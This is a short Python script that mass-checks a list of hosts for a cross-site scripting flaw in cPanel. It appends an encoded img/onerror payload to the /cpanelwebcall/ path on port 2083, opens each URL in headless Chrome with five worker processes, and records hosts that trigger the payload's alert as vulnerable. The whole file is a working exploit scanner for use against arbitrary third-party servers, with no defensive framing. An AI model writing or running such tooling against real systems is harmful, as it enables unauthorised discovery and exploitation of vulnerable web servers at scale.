import multiprocessing
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

def check_url(url):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    driver = webdriver.Chrome(options=chrome_options)

    try:
        driver.get(url)
        driver.implicitly_wait(5)
        alert = driver.switch_to.alert
        if alert.text == "kntl":
            with open("vuln.txt", "a") as f:
                f.write(url + "\n")
                print(f"[VULN XSS!] >> {url}")
        else:
            print(f"[BAD XSS!] >> {url}")
    except Exception as e:
        print(f"[UKNOWN ERRRO!] >> {url}")
    finally:
        driver.quit()

if __name__ == "__main__":
    with open("url.txt", "r") as f:
        urls = f.read().splitlines()

    processed_urls = [f"https://{url}:2083/cpanelwebcall/<img%20src=x%20onerror='prompt(`kntl`)'>aaaaaaaaaaaa" for url in urls]
    
    pool = multiprocessing.Pool(processes=5)
    pool.map(check_url, processed_urls)
